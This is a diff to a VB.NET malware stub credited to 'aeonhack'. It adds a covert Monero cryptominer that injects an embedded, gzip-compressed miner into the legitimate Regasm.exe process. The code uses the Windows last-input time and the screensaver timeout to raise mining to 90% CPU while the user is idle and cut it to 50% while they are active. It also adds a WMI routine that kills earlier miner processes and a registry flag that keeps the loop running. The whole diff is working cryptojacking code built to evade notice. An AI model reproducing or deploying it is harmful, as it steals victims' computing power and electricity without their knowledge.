@@ -1,7 +1,5 @@
 ﻿Imports System.Security
 Imports System.Runtime.InteropServices
-Imports System.Reflection
-Imports System.Management
 
 '------------------
 'Creator: aeonhack
@@ -113,12 +111,83 @@ Public Class Main
         Public StdError As IntPtr
     End Structure
 
-    Public Shared Sub XM(ByVal cpu As String, ByVal url As String, ByVal user As String, ByVal pass As String)
+    <StructLayout(LayoutKind.Sequential)>
+    Public Structure LASTINPUTINFO
+        Public cbSize As Int32
+        Public dwTime As Int32
+    End Structure
+    Private Declare Function GetTickCount Lib "kernel32" () As Long
+    Private Declare Function GetLastInputInfo Lib "User32.dll" (ByRef lastInput As LASTINPUTINFO) As Boolean
+    Public Shared idle As Boolean = False
+    Public Shared active As Boolean = False
+
+    Public Shared Sub XM(ByVal cpu As String, ByVal url As String, ByVal user As String, ByVal pass As String, ByVal HW As String)
+
+        Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & HW).SetValue("MinerXMR", "True") : Catch : End Try
+
         Try
-            Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=1 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=75", GZip(My.Resources.xm), True)
+            Try
+                If cpu.Contains("<CUS>") Then
+                    Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", cpu.Split("<CUS>")(0), GZip(My.Resources.xm), True)
+                    Return
+                End If
+            Catch ex As Exception
+            End Try
+
+            Dim TimeOUT As Integer = GetScreenSaverTimeOut() * 60
+            If GetScreenSaverTimeOut() <= 5 OrElse TimeOUT = 0 OrElse TimeOUT = -1 Then
+                TimeOUT = 300
+            End If
+
+            Do While Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & HW).GetValue("MinerXMR", "") = "True"
+                Threading.Thread.Sleep(10)
+                Dim lii As LASTINPUTINFO
+
+                lii.cbSize = Len(lii)
+                Call GetLastInputInfo(lii)
+
+                If FormatNumber((GetTickCount() - lii.dwTime) / 1000, 0) > TimeOUT AndAlso idle = False Then
+                    idle = True
+                    active = False
+                    Kill()
+
+                    Try
+                        Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=0 -t " & Environment.ProcessorCount & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=90", GZip(My.Resources.xm), True)
+                    Catch ex As Exception
+                        Run("C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", "-B --donate-level=0 -t " & Environment.ProcessorCount & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=90", GZip(My.Resources.xm), True)
+                    End Try
+
+                ElseIf FormatNumber((GetTickCount() - lii.dwTime) / 1000, 0) < TimeOUT AndAlso active = False Then
+                    active = True
+                    idle = False
+                    Kill()
+
+                    Try
+                        Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=0 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=50", GZip(My.Resources.xm), True)
+                    Catch ex As Exception
+                        Run("C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", "-B --donate-level=0 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=50", GZip(My.Resources.xm), True)
+                    End Try
+
+                End If
+            Loop
         Catch ex As Exception
-            Run("C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", "-B --donate-level=1 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=75", GZip(My.Resources.xm), True)
         End Try
+
+    End Sub
+
+    Public Shared Sub Kill()
+        On Error Resume Next
+        Dim objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
+        Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
+        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "Regasm.exe")
+        Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
+        Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
+        For Each retObject In colProcess
+            If retObject.CommandLine.ToString.Contains("--donate-level=") Then
+                retObject.Terminate()
+            End If
+        Next
+
     End Sub
 
     Public Shared Function Run(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean) As Boolean
@@ -227,6 +296,22 @@ Public Class Main
         Return True
     End Function
 
+    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByRef lpvParam As Integer, ByVal fuWinIni As Integer) As Integer
+    Private Const SPI_GETSCREENSAVETIMEOUT = 14
+
+    Public Shared Function GetScreenSaverTimeOut() As Integer
+        Dim lRet As Integer
+        Dim lSeconds As Integer
+        lRet = SystemParametersInfo _
+            (SPI_GETSCREENSAVETIMEOUT, 0, lSeconds, 0)
+        If lRet > 0 Then
+            GetScreenSaverTimeOut = lSeconds / 60
+        Else
+            'return -1 to indicate error condition
+            GetScreenSaverTimeOut = -1
+        End If
+    End Function
+
 
     Private Shared Function GZip(ByVal B As Byte()) As Byte()
         Try
@@ -245,4 +330,7 @@ Public Class Main
         Catch ex As Exception
         End Try
     End Function
+
+
+
 End Class
